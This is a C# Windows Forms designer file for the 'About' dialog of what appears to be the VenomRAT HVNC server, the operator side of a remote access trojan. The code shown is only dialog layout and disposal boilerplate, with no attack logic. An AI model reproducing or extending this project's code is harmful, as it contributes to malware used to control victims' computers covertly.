namespace VenomRAT_HVNC.Server.Forms
{
	public partial class FormAbout : global::System.Windows.Forms.Form
	{
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(global::VenomRAT_HVNC.Server.Forms.FormAbout));
			base.SuspendLayout();
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(333, 164);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedSingle;
			base.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "FormAbout";
			base.ShowInTaskbar = false;
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterParent;
			this.Text = "About";
			base.ResumeLayout(false);
		}

		private global::System.ComponentModel.IContainer components;
	}
}
